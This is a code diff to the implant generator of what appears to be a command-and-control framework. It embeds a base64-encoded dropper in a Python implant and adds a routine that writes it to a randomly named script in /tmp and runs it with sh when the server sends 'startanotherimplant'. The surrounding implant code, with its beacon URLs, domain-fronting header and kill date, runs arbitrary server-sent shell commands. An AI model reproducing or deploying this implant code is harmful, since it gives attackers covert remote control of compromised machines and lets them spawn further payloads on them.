@@ -31,6 +31,8 @@ class Implant(object):
     self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
     self.AllBeaconURLs = get_otherbeaconurls()
     self.AllBeaconImages = get_images()
+    with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
+        self.PythonImplant = base64.b64encode(f.read())
     self.PythonCore = """import urllib2, os, subprocess, re, datetime, time, base64, string, random
 hh = '%s'
 timer = %s
@@ -38,6 +40,15 @@ icoimage = [%s]
 urls = [%s]
 killdate = "%s"
 useragent = ""
+
+def sai():
+  imbase = "%s"
+  imfull = base64.b64decode(imbase)
+  output_file = open("/tmp/fdjskla.sh", 'w')
+  output_file.write(imfull)
+  output_file.close()
+  import subprocess
+  p = subprocess.Popen(["sh", "/tmp/fdjskla.sh"])
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
@@ -78,6 +89,8 @@ while(True):
           #print cmd
           if "$sleeptime" in cmd:
             timer = int(cmd.replace("$sleeptime = ",""))
+          elif "startanotherimplant" in cmd:   
+            sai()
           else:
             returnval = subprocess.check_output(cmd, shell=True)
             #print returnval
@@ -101,7 +114,7 @@ while(True):
     except Exception as e:
       E = e
       #print "error %%s" %% e
-      w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
+      w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
     self.C2Core = """
 $key="%s"
 $global:sleeptime = '%s'
